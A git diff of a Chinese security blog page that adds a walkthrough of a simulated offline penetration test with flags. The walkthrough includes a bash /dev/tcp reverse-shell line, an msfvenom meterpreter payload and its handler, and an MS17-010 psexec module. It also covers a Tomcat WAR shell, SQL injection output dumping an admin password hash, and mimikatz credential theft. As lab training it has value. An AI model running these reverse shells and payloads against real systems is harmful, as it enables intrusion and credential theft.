@@ -89,18 +89,34 @@
       
         <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　近期在整理以前的资料的时候，发现了去年做的某线下渗透测试的记录，这次渗透测试也比较契合实际环境中的渗透测试，所以我打算还是分享上来一来给自己复习一遍，二来也希望能给大家一点点渗透测试的思路。<br>　当开始做这次模拟的渗透测试的时候，只得到了一个信息，就是目标网站的域名。然后也没有告诉我们渗透到什么阶段才算结束了本次渗透。所以当时做的时候还比较懵逼<br>　这一点其实和我们做真实的渗透测试很像，当我们在做实际环境的渗透测试的时候，我们肯定也会有面临这样的情况，当目标只有一个域名，我们应该怎么做？那么其实按照一般的渗透测试步骤来说呢，总结起来就是寻找WEB服务的漏洞，尝试上传WEBSHELL，提权，内网嗅探，端口转发，内网渗透。然后再考虑权限的持久化等问题。等这一系列工作做完以后基本也就完成了一次较为完整的渗透测试。<br>　当然渗透测试也是需要根据具体情况来定的，渗透的步骤不是一成不变的。要根据具体环境具体情况来进行相应的调整。  </p>
 <h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>　废话说了一大堆，也不耽误时间了，我现在开始把这次渗透测试的过程给贴出来吧，由于时间过了很久了，并且当时时间也比较紧，有些步骤就没有进行截图。所以大家将就看看。了解个思路就是了。<br>　为了方便大家理解，我先把拓扑图给贴出来，当然这拓扑图是后来渗透做完后自己做的一个简单的拓扑。<br><img src="/2019/03/25/模拟环境的渗透测试/拓扑图.png" alt=""><br>　1.我们目前能访问的就只有192.168.5.10这个网站,这个网站是一家公司主页，经过系列浏览与探索，知道该网站使用的是PHP,并且发现了一处类似文件包含的页面。如图：<br><img src="/2019/03/25/模拟环境的渗透测试/5.10.png" alt=""><br>　看到这里应该，第一个能想到的就是包含漏洞，而文件包含漏洞也分为本地文件包含于远程文件包含，如果是本地文件包含漏洞的话，我们可以利用它读取服务器上的文件，尝试读取源码，或者找到上传点再去包含webshell文件。而如果是远程文件包含的话就更方便了，可以直接尝试包含webshell。不过要注意的是远程文件包含不能包含以PHP为后缀的文件。<br>　在这里我使用了PHP的伪协议进行测试，发现确实是存在漏洞，如果已经能执行命令了，那么代表其一定能够远程文件包含。<br><img src="/2019/03/25/模拟环境的渗透测试/info.png" alt=""><br>　远程文件包含，我相信大家也都知道怎么去运用，由于本次的渗透是线下的，并且不通外网，我们直接在本地搭建HTTP服务，将我们的WEBSHELL放进去，并在目标站点包含我们这个shell文件就可以了，不过要注意，一定不能是PHP后缀。<br>　这里我在shell中添加了PHPinfo方便判断是否包含成功。可以看到是成功包含了的。<br><img src="/2019/03/25/模拟环境的渗透测试/shell.png" alt=""><br>　然后就是大家熟悉的东西了，上菜刀。ＨＨＨ<br><img src="/2019/03/25/模拟环境的渗透测试/菜刀.png" alt=""><br>　尝试是否能执行命令，查看权限。<br><img src="/2019/03/25/模拟环境的渗透测试/whoami.png" alt=""><br>　可以看到是一个低权限用户。那么先考虑进行提权，根据系统内核寻找exp进行提权。<br><img src="/2019/03/25/模拟环境的渗透测试/uname.png" alt=""><br>　由于我当时用的EXP提权的话，需要有交互，而菜刀并不能提供交互式的shell，所以我当时使用NC监听并进行端口转发。不过当时并未截图，我将方法写出来吧。<br>目标端：/bin/bash/ -i &gt; /dev/tcp/192/168.5.107/7777 0&lt;&amp;1 2&gt;&amp;1<br>攻击端：nc -lvnp 7777<br>也就是将bash转发到我们的7777端口，并监听建立连接。<br>　如图，已经将我们的权限提升为ROOT,不过需要注意的是，这个提权只是提升了bash的权限，为了方便后续渗透，我们需要创建一个属于root组的用户。创建账户我也就没有截图了。<br><img src="/2019/03/25/模拟环境的渗透测试/EXP.png" alt=""><br>　登录ssh,可以看到我们是root组的用户。（这里强烈推荐一下MobaXterm这个终端管理工具，巨好用。）<br><img src="/2019/03/25/模拟环境的渗透测试/xshell.png" alt=""><br>　做到这里，我们来梳理一下，我们目前已经上传了shell并且得到了root权限。那么就应该考虑一下内网渗透了，那么做内网渗透就不的不提MSF了吧。为了方便我们后续的内网渗透能顺利开展，我们先使用MSF生成一个后门，并执行它。<br>　生成后门（如果对方机器有杀软可以添加编码等尝试绕过，这里目标机没有我也就没做了。）PS 没有截图 =。=<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.5.107 LPORT=4444 -f elf &gt;shell.elf</span><br></pre></td></tr></table></figure></p>
-<p>　在msf中启动监听。  </p>
-<pre><code>　use exploit/multi/handler  
-　set PAYLOAD linux/x86/meterpreter/reverse_tcp  
-　set LHOST 0.0.0.0  
-　exploit   
-</code></pre><p>　然后在目标服务器上运行我们的后门。<br>　可以看到msf的控制台中已经将shell反弹回来。<br><img src="/2019/03/25/模拟环境的渗透测试/msf.png" alt=""><br>　当时使用msf的时候，遇到了个坑，本来是打算使用msf做内网渗透的，而由于当时们整个测试地点都处于内网，不能连通外网，并且我的msf并没有下载NMAP模块=。=，所以导致我后续的渗透都没使用msf平台了。不过在实际环境中并不会有影响，使用msf的话，可以极大的提高我们的效率。<br>　于是转变了下思路，将我的nmap源码上传到5.10这个边界服务器上，进行编译，然后扫描。PS（实际环境中这样不可取，及容易触发安全机制。）扫描情况如下所示（有路由，有FTP服务器，有2台服务器web服务，还有ssh,3389等。）<br><img src="/2019/03/25/模拟环境的渗透测试/nmap1.png" alt=""><br><img src="/2019/03/25/模拟环境的渗透测试/nmap2.png" alt=""><br><img src="/2019/03/25/模拟环境的渗透测试/nmap3.png" alt="">  </p>
+<p>　在msf中启动监听。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">　use exploit/multi/handler  </span><br><span class="line">　set PAYLOAD linux/x86/meterpreter/reverse_tcp  </span><br><span class="line">　set LHOST 0.0.0.0  </span><br><span class="line">　exploit   </span><br><span class="line">```  </span><br><span class="line">　然后在目标服务器上运行我们的后门。  </span><br><span class="line">　可以看到msf的控制台中已经将shell反弹回来。</span><br><span class="line">![](模拟环境的渗透测试/msf.png)  </span><br><span class="line">　当时使用msf的时候，遇到了个坑，本来是打算使用msf做内网渗透的，而由于当时们整个测试地点都处于内网，不能连通外网，并且我的msf并没有下载NMAP模块=。=，所以导致我后续的渗透都没使用msf平台了。不过在实际环境中并不会有影响，使用msf的话，可以极大的提高我们的效率。  </span><br><span class="line">　于是转变了下思路，将我的nmap源码上传到5.10这个边界服务器上，进行编译，然后扫描。PS（实际环境中这样不可取，及容易触发安全机制。）扫描情况如下所示（有路由，有FTP服务器，有2台服务器web服务，还有ssh,3389等。）</span><br><span class="line">![](模拟环境的渗透测试/nmap1.png)</span><br><span class="line">![](模拟环境的渗透测试/nmap2.png)</span><br><span class="line">![](模拟环境的渗透测试/nmap3.png)  </span><br><span class="line">　看完扫描结果后，大致有了思路，SSH,FTP,3389可以使用爆破的方式进行渗透，445则考虑永恒之蓝，80的话就是常规的WEB渗透进行。</span><br><span class="line">### 内网阶段</span><br><span class="line">　到这里也就到了内网的渗透阶段了，现在我们知道了，目标内网的分布情况，并且有一台已完全控制的主机，到这里的时候我并未先对ssh，ftp,3389进行爆破，也没有尝试使用永恒之蓝对445进行攻击，我感兴趣的是那两个web服务。  </span><br><span class="line">　而那两个ｗｅｂ服务处于内网，我们是无法直接访问到的，这个时候就需要使用代理了，代理转发的方式很多，工具也很多，这里我不一一列举了，我这里使用的ew进行反向代理。如图：</span><br><span class="line">![](模拟环境的渗透测试/ew.png)  </span><br><span class="line">　现在目标服务器已经和本地建立了socks连接了，我们需要做的就是连接这个socks。然后访问其内网。WINDOWS平台下，大家一般可能会选择regeorg或者proxifer,而linux下则一般会选择proxychains。（不过在这里，我会推荐一款WINDOWS下更好用的代理工具，SocksCap，本来这是一款网游的加速代理工具，但是其可以指定特定的程序进行socks连接，超级好用并且稳定，感兴趣的同学可以试试。）这里并没有截图，后面我会补上这个软件的截图。  </span><br><span class="line">　使用代理后，我们去访问内网的那两个WEB服务器器。首先是192.168.6.16这个服务器，他开放了80,8080这两个WEB端口，80端口我访问的时候，没有任何内容，这个时候看到了8080端口，而8080又是Tomcat的端口号，加上80端口里面还没有内容，初步怀疑是才搭建的服务，而Tomcat拿shell的方式，我相信大家也清楚，就是利用登录后上传war包从而拿到shell。到这里就有思路了，就是登录Tomcat的管理业页面。  </span><br><span class="line">　直接尝试弱口令登录成功。找到上传war包的地点，上传编译好的war包。</span><br><span class="line">![](模拟环境的渗透测试/war.png)  </span><br><span class="line">　可以看到，我们的权限直接是root。这是因为基本上部署Tomcat的时候，都是使用的高权限用户进行的部署，所以其默认继承该高权限用户，所以直接是root权限。</span><br><span class="line">![](模拟环境的渗透测试/tm_shell.png)  </span><br><span class="line">　在这里贴张图给大家看一下，war怎么编译吧。</span><br><span class="line">![](模拟环境的渗透测试/bywar.png)  </span><br><span class="line">　这个站点找到了一个flag,并且测试该服务器下没有二级网络，于是这台服务器也搞定。</span><br><span class="line">![](模拟环境的渗透测试/flag1.png)  </span><br><span class="line">　接下来是192.168.6.17这个站点，这台服务器也开放了８０端口，是一台内部的OA系统。尝试了弱口令爆破登录，没有成功。使用御剑扫描目录的时候，扫描到了一个massage.php页面，尝试访问发现没有提升登录，但是该页面没有内容，考虑到可能是一个信息页面可能与数据库有交互，于是使用了几个常用的参数进行测试发现当输入？id=1时，页面显示了系统维护。如图：</span><br><span class="line">![](模拟环境的渗透测试/维护.png)  </span><br><span class="line">　那么有趣的地方来了，内网相对于外网肯定会薄弱很多，这个地方可能存在注入，那么直接一套连招，and 1 = 1 #，and 1 = 2# 发现果然存在注入。那么直接使用sqlmap并加上代理跑就完事了。  </span><br><span class="line">![](模拟环境的渗透测试/sqlmap1.jpg)  </span><br><span class="line">　跑出来了OA管理员的密码MD5，电脑不能访问公网，于是用手机一个一个敲，在MD5网站解出来了密码为 &quot;37s984pass&quot;难怪爆破不出来=。=。</span><br></pre></td></tr></table></figure></p>
+<p>Database: my_oa</p>
+<pre><code>Table: admin
+
+[1 entry]
+
++----+----------------------------------+----------+
+
+| id | password                        | username |
+
++----+----------------------------------+----------+
+
+| 1  | 29acd667cdbee1116d365727ca6821d3 | admin    |
+
++----+----------------------------------+----------+
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">　尝试了下使用sqlmap写shell文件，发现没有导出的权限，于是放弃了。那么接下来又是常规操作了，登录OA，寻找突破点，果然找到了处上传点。美滋滋。^_^.</span><br><span class="line">![](模拟环境的渗透测试/upload.png)  </span><br><span class="line">　这里上传的时候遇到了问题，我直接上传PHP马，没有任何返回信息，而当我上传正常图片的时候它返回了上传成功，并显示了上传后的文件名，我发现其文件名进行了更改，并且像是按照时间格式进行的重命名。</span><br><span class="line">　于是这里，我使用了burp进行抓包上传，因为这样可以很方便的查看系统返回的时间。(注意该站点属于目标内网，所以burp也需要设置socks代理。具体如何设置网上有很多教程，我也不做演示了。)</span><br><span class="line">![](模拟环境的渗透测试/burp.png)  </span><br><span class="line">　如图根据这个返回的时间，找到了我们上传的webshell。</span><br><span class="line">![](模拟环境的渗透测试/shell2.png)  </span><br><span class="line">　查看网卡，没有二级网络，并且当时在翻阅目录的时候，找到了flag,也就没做提权了。</span><br><span class="line">![](模拟环境的渗透测试/flag2.png)  </span><br><span class="line">　到这里我说一下，当时我做的时候，可能是我的字典不够强大的原因，所以服务器我没有一个爆破下来的= 。=可怜！  </span><br><span class="line">　爆破不成功，那么还有个445端口嘛，内网一般都没做修复，直接MS17010去照顾一下它。前面渗透边界服务器的时候不是已经反弹了一个shell到MSF上了吗。这个时候只需要添加一个路由。</span><br><span class="line">![](模拟环境的渗透测试/luyou.png)  </span><br><span class="line"></span><br><span class="line">　然后显示MS17010的payload(没截图=。=)</span><br></pre></td></tr></table></figure>
+<p>use exploit windows/smb/ms17_010_psexec<br>show PAYLOAD<br><code>`</code><br>　然后选择设置payload。如图：  </p>
+<p><img src="/2019/03/25/模拟环境的渗透测试/payload.png" alt=""><br>　注意这里设置好后先别着急使用run去运行这个payload<br><img src="/2019/03/25/模拟环境的渗透测试/设置.png" alt=""><br>　我们先到边界服务器，上传一个NC，然后监听4555端口，然后在run,可以看到这个时候已经将shell反弹回来，并且是system权限了。<br><img src="/2019/03/25/模拟环境的渗透测试/nc.png" alt=""><br>　考虑到这是一台Windows主机，并且没有其他服务，猜测其可能存在域，于是使用一些域命令进行信息收集。域管理为administrator<br><img src="/2019/03/25/模拟环境的渗透测试/yu1.png" alt="">  </p>
+<p><img src="/2019/03/25/模拟环境的渗透测试/yu2.png" alt="">  </p>
+<p><img src="/2019/03/25/模拟环境的渗透测试/yu3.png" alt=""><br>　NMAP做端口扫描的时候，我们知道了这台服务器开启了3389端口的。于是我现在的思路是创建一个属于admin组的用户，在登录3389（不过这里需要注意的是，该机器处于内网，我们是无法直接连接3389，还是需要使用到之前在边界服务器设置的socks代理）。<br>　创建账户<br><img src="/2019/03/25/模拟环境的渗透测试/user.png" alt=""><br>　登录3389<br><img src="/2019/03/25/模拟环境的渗透测试/3389.png" alt=""><br>　因为我们是新建立的用户，无法访问到其他账户的信息，所以桌面很干净哈哈哈。（思路：这个时候，有几个要点，1.我们虽然登录上了3389但是访问不到其他用户的数据，2.我们处于一个域环境，这台主机有可能被域管理登录过。PS： Windows域中，域管理有可能会统一对域内机器进行维护，所以有可能被域管理登录过。）<br>　这个时候我们要做的是，那就是使用mimikatz去抓密码。而mimikatz必须是最高权限才行，虽然我们现在是admin组，但是权限仍然不满足条件。通过systeminfo查看补丁,我找了个EXP，MS14-058来进行权限提升。<br>　将mimikatz和MS14-058上传到边界服务，然后下载到0.200这台服务器上。<br><img src="/2019/03/25/模拟环境的渗透测试/shell3.png" alt=""><br>　并如图所示使用MS14-058配合mimikatz抓取密码。管理和域控的密码都抓到了。<br><img src="/2019/03/25/模拟环境的渗透测试/mimi.png" alt=""><br><img src="/2019/03/25/模拟环境的渗透测试/mimi2.png" alt=""><br>　查看网卡，发现还有10的地址<br><img src="/2019/03/25/模拟环境的渗透测试/yu4.png" alt=""><br>　查看网络,尝试连接WIN那台主机，发现没有开启3389<br><img src="/2019/03/25/模拟环境的渗透测试/wangluo.png" alt=""><br>　现在我们有了域控的密码。意思就是只要在域内的主机我们都能登录，所以我们需要去开启该主机的3389<br>　其实也很简单，上传开启3389的VBS脚本，并使用$IPC共享到目标主机，并启动定时任务。运行该VBS脚本。即可。详细步骤我当时没有截图。但是可以参考这个网址进行操作。<a href="https://wenku.baidu.com/view/f965f6ece009581b6bd9eb2c.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/f965f6ece009581b6bd9eb2c.html</a><br>　最后使用域控进行登录<br><img src="/2019/03/25/模拟环境的渗透测试/33892.png" alt=""><br>　拿到flag<br><img src="/2019/03/25/模拟环境的渗透测试/flag3.png" alt="">  </p>
+<h3 id="完结"><a href="#完结" class="headerlink" title="完结"></a>完结</h3><p>本文只是作为分享，如果有错误的地方，还请见谅。✿✿ヽ(°▽°)ノ✿。
+　</p>
 <p>　</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://holdontoyourheart.github.io/2019/03/25/模拟环境的渗透测试/" data-id="cjtofiojh0009nwjiureynrs2" class="article-share-link">Share</a>
+      <a data-url="https://holdontoyourheart.github.io/2019/03/25/模拟环境的渗透测试/" data-id="cjtolhxxd000fqcjigkx90rw7" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li></ul>
@@ -141,7 +157,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://holdontoyourheart.github.io/2019/01/02/Nessus报告汉化篇二/" data-id="cjtofioi70001nwjik9s6vuio" class="article-share-link">Share</a>
+      <a data-url="https://holdontoyourheart.github.io/2019/01/02/Nessus报告汉化篇二/" data-id="cjtolhxtw0001qcji8svr9bd2" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
@@ -182,7 +198,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://holdontoyourheart.github.io/2018/12/28/Nessus报告汉化篇/" data-id="cjtofioh60000nwji3i11snyv" class="article-share-link">Share</a>
+      <a data-url="https://holdontoyourheart.github.io/2018/12/28/Nessus报告汉化篇/" data-id="cjtolhxth0000qcji1z52e81k" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
@@ -220,7 +236,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://holdontoyourheart.github.io/2018/12/28/WEB安全/" data-id="cjtofioil0003nwjio6lss5ew" class="article-share-link">Share</a>
+      <a data-url="https://holdontoyourheart.github.io/2018/12/28/WEB安全/" data-id="cjtolhxu70003qcjisoo480q7" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li></ul>
@@ -263,7 +279,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://holdontoyourheart.github.io/2018/12/28/个人简介/" data-id="cjtofioiy0004nwjim7xaapf3" class="article-share-link">Share</a>
+      <a data-url="https://holdontoyourheart.github.io/2018/12/28/个人简介/" data-id="cjtolhxv50005qcji0z54h5f7" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/杂记/">杂记</a></li></ul>
@@ -310,7 +326,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://holdontoyourheart.github.io/2018/11/02/hello-world/" data-id="cjtofioj10005nwjic4b5b2uq" class="article-share-link">Share</a>
+      <a data-url="https://holdontoyourheart.github.io/2018/11/02/hello-world/" data-id="cjtolhxus0004qcjilw0lcez4" class="article-share-link">Share</a>
       
       
     </footer>
